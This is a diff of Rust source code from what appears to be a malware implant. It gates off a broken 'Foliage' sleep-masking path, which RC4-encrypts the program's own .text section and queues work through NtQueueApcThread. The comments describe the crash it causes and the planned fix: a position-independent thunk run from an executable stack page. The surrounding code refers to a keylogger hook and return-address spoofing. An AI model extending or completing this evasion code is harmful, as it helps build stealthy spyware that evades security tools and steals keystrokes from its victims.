@@ -273,7 +273,20 @@ fn execute_foliage_plan(plan: &FoliagePlan) {
     // .text doesn't corrupt the in-flight instructions. The thunk builder is
     // research-grade; its opcode sequence has NOT been validated on a real
     // target in this codebase — the gate is the honesty mechanism.
-    if foliage_apc_enabled() && !crate::keylog::hook_is_active() {
+    // Hard gate: the APC path calls execute_foliage_apc → foliage_helper, which
+    // currently masks .text FROM .text (the helper fn body lives in .text).
+    // The moment RC4 encrypts .text (line ~787), the helper's next instruction
+    // fetch executes ciphertext → 0xC0000005 ACCESS_VIOLATION. Confirmed on
+    // Server 2019 17763 (2026-07-06 test run).
+    //
+    // The fix is the PIC thunk: rewrite foliage_helper to copy
+    // pic_thunk::build_mask_thunk() bytes onto an executable stack page and
+    // queue THAT via NtQueueApcThread (the thunk runs from the stack, not
+    // .text, so encrypting .text is safe). Until that rewrite lands,
+    // FOLIAGE_APC_THUNK_WIRED stays false and the APC path is never taken —
+    // regardless of NYX_FOLIAGE_APC_ON. This is the honest gate.
+    const FOLIAGE_APC_THUNK_WIRED: bool = false;
+    if FOLIAGE_APC_THUNK_WIRED && foliage_apc_enabled() && !crate::keylog::hook_is_active() {
         if let Some(r) = &region {
             crate::entry::diag_mark(b"E2_apc_attempt");
             if unsafe { execute_foliage_apc(r, &plan.key, secs, spoof_rip) } {
